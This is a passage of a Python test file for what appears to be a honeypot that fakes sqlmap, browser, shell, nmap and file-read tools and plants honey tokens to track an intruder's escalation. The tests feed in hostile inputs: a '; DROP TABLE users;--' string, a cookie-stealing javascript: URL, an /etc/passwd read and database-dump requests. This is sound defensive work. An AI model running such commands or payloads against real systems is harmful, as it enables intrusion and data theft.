        assert "key_value" in result.output
        with get_connection(config.db_path) as conn:
            tokens = conn.execute(
                "SELECT * FROM honey_tokens WHERE session_id = ?",
                (session_id,),
            ).fetchall()
        assert len(tokens) >= 1

    def test_dump_deploy_keys_table(self, config, registry, session_id):
        """Dumping 'deploy_keys' table should produce SSH key data and generate tokens."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "dump", "table": "deploy_keys"},
            session_id,
        )
        assert "prod-deploy" in result.output
        assert "SSH" in result.output or "private key" in result.output.lower()
        with get_connection(config.db_path) as conn:
            tokens = conn.execute(
                "SELECT * FROM honey_tokens WHERE session_id = ?",
                (session_id,),
            ).fetchall()
        assert len(tokens) >= 1

    def test_dump_tracks_credentials_in_session(
        self, registry, session_id, session_manager
    ):
        """Dumping sensitive tables should add credential entries to the session."""
        registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "dump", "table": "users"},
            session_id,
        )
        ctx = session_manager.get(session_id)
        assert len(ctx.discovered_credentials) >= 2

    def test_databases_action_lists_all(self, registry, session_id):
        """The 'databases' action should list all fake databases."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "databases"},
            session_id,
        )
        assert "production" in result.output
        assert "analytics" in result.output
        assert "internal_tools" in result.output
        assert "backup_2024" in result.output

    def test_tables_for_known_database(self, registry, session_id):
        """Requesting tables for a known database should list its tables."""
        result = registry.dispatch(
            "sqlmap_scan",
            {
                "url": "http://target/page?id=1",
                "action": "tables",
                "database": "internal_tools",
            },
            session_id,
        )
        assert "admin_users" in result.output
        assert "deploy_keys" in result.output

    def test_tables_for_unknown_database_falls_back(self, registry, session_id):
        """Requesting tables for an unknown database should fall back to 'production'."""
        result = registry.dispatch(
            "sqlmap_scan",
            {
                "url": "http://target/page?id=1",
                "action": "tables",
                "database": "totally_fake_db",
            },
            session_id,
        )
        assert "users" in result.output
        assert "payments" in result.output

    def test_action_defaults_to_test(self, registry, session_id):
        """Omitting the 'action' key should default to 'test'."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1"},
            session_id,
        )
        assert "injectable" in result.output

    def test_url_with_unicode(self, registry, session_id):
        """Unicode in URL should not crash."""
        result = registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=\u00e9\u00e8\u00ea", "action": "test"},
            session_id,
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_columns_for_admin_users_table(self, registry, session_id):
        """Requesting columns for admin_users should return its specific column list."""
        result = registry.dispatch(
            "sqlmap_scan",
            {
                "url": "http://target/page?id=1",
                "action": "columns",
                "table": "admin_users",
            },
            session_id,
        )
        assert "username" in result.output
        assert "password" in result.output
        assert "mfa_secret" in result.output


# ---------------------------------------------------------------------------
# BrowserSimulator
# ---------------------------------------------------------------------------


class TestBrowserEdgeCases:
    """Edge cases for the browser_navigate simulator."""

    def test_missing_url_argument(self, registry, session_id):
        """Omitting 'url' should default to empty string and return a 404."""
        result = registry.dispatch("browser_navigate", {}, session_id)
        assert "404" in result.output
        assert "Not Found" in result.output

    def test_empty_url_string(self, registry, session_id):
        """An empty URL string should return a 404 page."""
        result = registry.dispatch(
            "browser_navigate", {"url": "", "action": "navigate"}, session_id
        )
        assert "404" in result.output

    def test_url_with_trailing_slashes(self, registry, session_id):
        """Trailing slashes should be stripped; /admin/ should match /admin."""
        result = registry.dispatch(
            "browser_navigate", {"url": "/admin/", "action": "navigate"}, session_id
        )
        assert "login" in result.output.lower() or "Login" in result.output

    def test_unknown_action_defaults_to_navigate(self, registry, session_id):
        """An action not in the dispatch (like 'navigate') for an admin page
        should show the login form, not the submit result."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/admin", "action": "navigate"},
            session_id,
        )
        assert "form" in result.output.lower() or "username" in result.output

    def test_submit_action_on_login(self, registry, session_id):
        """Submitting the login form should return a redirect-style response."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/admin/login", "action": "submit"},
            session_id,
        )
        assert "302" in result.output or "successful" in result.output.lower()

    def test_fill_action_on_login(self, registry, session_id):
        """Fill action on login should also return the redirect response."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/admin/login", "action": "fill"},
            session_id,
        )
        assert "302" in result.output or "successful" in result.output.lower()

    def test_unknown_path_returns_404_not_error(self, registry, session_id):
        """A 404 page should NOT have is_error=True (it is valid HTTP behavior)."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/totally/unknown/path", "action": "navigate"},
            session_id,
        )
        assert result.is_error is False
        assert "404" in result.output

    def test_full_url_path_extraction(self, registry, session_id):
        """Full URLs with scheme://host/path should extract only the path portion."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "https://internal.corp.com/api/health", "action": "navigate"},
            session_id,
        )
        assert "healthy" in result.output

    def test_url_with_query_parameters(self, registry, session_id):
        """A URL with query parameters on a known path should still trigger the handler
        only if the path portion matches (query params are NOT stripped, so it may 404)."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/api/health?verbose=true", "action": "navigate"},
            session_id,
        )
        # The path becomes "/api/health?verbose=true" which does NOT match "/api/health"
        assert "404" in result.output or "healthy" in result.output

    def test_multiple_navigations_accumulate_no_duplicate_tokens(
        self, config, registry, session_id
    ):
        """Navigating to the same token-generating page twice should produce
        tokens both times (each call generates fresh tokens)."""
        registry.dispatch(
            "browser_navigate",
            {"url": "/api/users", "action": "navigate"},
            session_id,
        )
        with get_connection(config.db_path) as conn:
            count_1 = conn.execute(
                "SELECT COUNT(*) FROM honey_tokens WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0]

        registry.dispatch(
            "browser_navigate",
            {"url": "/api/users", "action": "navigate"},
            session_id,
        )
        with get_connection(config.db_path) as conn:
            count_2 = conn.execute(
                "SELECT COUNT(*) FROM honey_tokens WHERE session_id = ?",
                (session_id,),
            ).fetchone()[0]

        assert count_2 > count_1

    # --- Additional edge cases ---

    def test_extremely_long_url(self, registry, session_id):
        """An extremely long URL should not crash the simulator."""
        long_url = "/admin/" + "a" * 10000
        result = registry.dispatch(
            "browser_navigate",
            {"url": long_url, "action": "navigate"},
            session_id,
        )
        assert isinstance(result.output, str)
        # The long path won't match anything, so it should 404
        assert "404" in result.output

    def test_url_with_fragment(self, registry, session_id):
        """A URL with a fragment (#section) should not crash."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/admin#section", "action": "navigate"},
            session_id,
        )
        assert isinstance(result.output, str)
        # /admin#section won't match /admin exactly after rstrip("/")

    def test_url_with_null_bytes(self, registry, session_id):
        """Null bytes in URL should not crash the simulator."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/admin\x00/login", "action": "navigate"},
            session_id,
        )
        assert isinstance(result.output, str)

    def test_url_with_unicode_characters(self, registry, session_id):
        """Unicode characters in URL should not crash."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/admin/\u202e\u0301", "action": "navigate"},
            session_id,
        )
        assert isinstance(result.output, str)

    def test_url_with_newlines(self, registry, session_id):
        """Newline characters in URL should not crash."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/admin\r\n/dashboard", "action": "navigate"},
            session_id,
        )
        assert isinstance(result.output, str)

    def test_javascript_scheme_url(self, registry, session_id):
        """A javascript: URL should be handled safely."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "javascript:alert(document.cookie)", "action": "navigate"},
            session_id,
        )
        assert isinstance(result.output, str)
        # Should not crash; probably 404 since path extraction won't match
        assert result.is_error is False

    def test_data_scheme_url(self, registry, session_id):
        """A data: URL should be handled safely."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "data:text/html,<h1>test</h1>", "action": "navigate"},
            session_id,
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_scheme_only_url(self, registry, session_id):
        """A URL that is only a scheme (http://) should not crash."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "http://", "action": "navigate"},
            session_id,
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_double_slash_path(self, registry, session_id):
        """A URL with double slashes should not crash."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "//admin", "action": "navigate"},
            session_id,
        )
        assert isinstance(result.output, str)

    def test_unrecognized_action_on_non_login_page(self, registry, session_id):
        """An unrecognized action value on a non-login page should not crash."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/api/health", "action": "delete"},
            session_id,
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_action_defaults_to_navigate(self, registry, session_id):
        """Omitting the 'action' key should default to 'navigate'."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/api/health"},
            session_id,
        )
        assert "healthy" in result.output

    def test_api_config_generates_tokens(self, config, registry, session_id):
        """Navigating to /api/config should generate AWS honey tokens."""
        registry.dispatch(
            "browser_navigate",
            {"url": "/api/config", "action": "navigate"},
            session_id,
        )
        with get_connection(config.db_path) as conn:
            tokens = conn.execute(
                "SELECT * FROM honey_tokens WHERE session_id = ?",
                (session_id,),
            ).fetchall()
        assert len(tokens) >= 1

    def test_api_config_escalation(self, registry, session_id, session_manager):
        """Navigating to /api/config should increase escalation."""
        registry.dispatch(
            "browser_navigate",
            {"url": "/api/config", "action": "navigate"},
            session_id,
        )
        ctx = session_manager.get(session_id)
        assert ctx.escalation_level >= 1

    def test_api_users_generates_tokens(self, config, registry, session_id):
        """Navigating to /api/users should generate API_TOKEN and ADMIN_LOGIN tokens."""
        registry.dispatch(
            "browser_navigate",
            {"url": "/api/users", "action": "navigate"},
            session_id,
        )
        with get_connection(config.db_path) as conn:
            tokens = conn.execute(
                "SELECT token_type FROM honey_tokens WHERE session_id = ?",
                (session_id,),
            ).fetchall()
        token_types = [t[0] for t in tokens]
        assert "api_token" in token_types
        assert "admin_login" in token_types

    def test_url_with_special_characters_in_path(self, registry, session_id):
        """Special characters in path should not crash."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/api/users?sort=id&order=desc; DROP TABLE users;--"},
            session_id,
        )
        assert isinstance(result.output, str)

    def test_multiple_trailing_slashes(self, registry, session_id):
        """Multiple trailing slashes should be stripped to match dispatch."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/admin///", "action": "navigate"},
            session_id,
        )
        # rstrip("/") removes all trailing slashes, leaving "/admin"
        # but only if the full path was "/admin///"
        # Actually, "/admin///" -> rstrip("/") -> "/admin" -> matches /admin
        assert isinstance(result.output, str)

    def test_selector_and_value_on_navigate(self, registry, session_id):
        """Providing selector and value arguments on navigate should not crash."""
        result = registry.dispatch(
            "browser_navigate",
            {
                "url": "/admin",
                "action": "navigate",
                "selector": "#username",
                "value": "admin",
            },
            session_id,
        )
        assert isinstance(result.output, str)
        assert result.is_error is False

    def test_click_action_on_login(self, registry, session_id):
        """Click action on login page should show the login form (not submit behavior)."""
        result = registry.dispatch(
            "browser_navigate",
            {"url": "/admin/login", "action": "click"},
            session_id,
        )
        # click is not in ("fill", "submit"), so it shows the form
        assert "form" in result.output.lower() or "username" in result.output


# ---------------------------------------------------------------------------
# Cross-Simulator Edge Cases
# ---------------------------------------------------------------------------


class TestCrossSimulatorEdgeCases:
    """Tests that span multiple simulators or test registry-level behavior."""

    def test_unknown_tool_name(self, registry, session_id):
        """Dispatching to a nonexistent tool should return an error result."""
        result = registry.dispatch("nonexistent_tool", {}, session_id)
        assert result.is_error is True
        assert "unknown tool" in result.output

    def test_invalid_session_id(self, registry):
        """Using an invalid session ID should return an error result."""
        result = registry.dispatch("shell_exec", {"command": "whoami"}, "invalid-session-id")
        assert result.is_error is True
        assert "invalid session" in result.output

    def test_empty_session_id(self, registry):
        """Using an empty session ID should return an error result."""
        result = registry.dispatch("shell_exec", {"command": "whoami"}, "")
        assert result.is_error is True
        assert "invalid session" in result.output

    def test_simulation_result_structure(self, registry, session_id):
        """Every SimulationResult should have the expected fields."""
        result = registry.dispatch("shell_exec", {"command": "whoami"}, session_id)
        assert hasattr(result, "output")
        assert hasattr(result, "is_error")
        assert hasattr(result, "injected_token_ids")
        assert hasattr(result, "escalation_delta")
        assert isinstance(result.output, str)
        assert isinstance(result.is_error, bool)
        assert isinstance(result.injected_token_ids, list)
        assert isinstance(result.escalation_delta, int)

    def test_rapid_sequential_dispatches(self, registry, session_id, session_manager):
        """Multiple rapid dispatches should not corrupt session state."""
        for i in range(20):
            registry.dispatch("shell_exec", {"command": "whoami"}, session_id)
        ctx = session_manager.get(session_id)
        # Session should still be valid and accessible
        assert ctx is not None
        assert ctx.session_id == session_id

    def test_mixed_simulator_dispatches(self, registry, session_id, session_manager):
        """Using multiple different simulators in the same session should
        accumulate state correctly."""
        registry.dispatch("shell_exec", {"command": "whoami"}, session_id)
        registry.dispatch("nmap_scan", {"target": "10.0.1.10"}, session_id)
        registry.dispatch("file_read", {"path": "/etc/passwd"}, session_id)
        registry.dispatch(
            "sqlmap_scan",
            {"url": "http://target/page?id=1", "action": "test"},
            session_id,
        )
        registry.dispatch(
            "browser_navigate",
            {"url": "/api/health", "action": "navigate"},
            session_id,
        )

        ctx = session_manager.get(session_id)
        assert len(ctx.discovered_hosts) >= 1
        assert len(ctx.discovered_files) >= 1
        assert ctx.escalation_level >= 1

    def test_escalation_caps_at_three(self, registry, session_id, session_manager):
        """Escalation level should never exceed 3 regardless of how many
        escalation-triggering actions are taken."""
        # Each of these contributes escalation
        for _ in range(10):
            registry.dispatch("nmap_scan", {"target": "10.0.1.10"}, session_id)
            registry.dispatch("file_read", {"path": "/etc/passwd"}, session_id)
            registry.dispatch(
                "sqlmap_scan",
                {"url": "http://target/page?id=1", "action": "dump", "table": "users"},
                session_id,
            )

        ctx = session_manager.get(session_id)
        assert ctx.escalation_level <= 3
